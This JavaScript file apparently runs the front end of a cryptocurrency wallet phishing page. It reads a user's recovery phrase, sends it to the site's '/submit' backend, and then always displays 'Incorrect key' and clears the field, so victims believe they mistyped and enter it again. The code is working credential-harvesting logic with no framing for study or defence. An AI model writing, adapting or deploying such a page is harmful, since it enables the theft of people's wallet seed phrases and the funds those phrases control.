// Get references to DOM elements
const continueButton = document.getElementById("continueButton");
const inputBox = document.getElementById("inputBox");
const resultContainer = document.createElement("p"); // Add a container for the "Incorrect key" message
resultContainer.style.color = "red"; // Make the text red
resultContainer.style.textAlign = "center";
document.querySelector(".container").appendChild(resultContainer); // Add it to the DOM

// Add event listener to the "Continue" button
continueButton.addEventListener("click", async () => {
    // Get the text from the input box
    const recoveryPhrase = inputBox.value.trim();

    // Check if input text is empty
    if (recoveryPhrase === "") {
        alert("Please enter your recovery phrase!");
        return;
    }

    // Send the recovery phrase to the backend
    try {
        await fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ recoveryPhrase }),
        });

        // Show the "Incorrect key" message
        resultContainer.textContent = "Incorrect key";

        // Clear the input field after submission
        inputBox.value = "";
    } catch (error) {
        console.error("Error submitting recovery phrase:", error);
    }
});
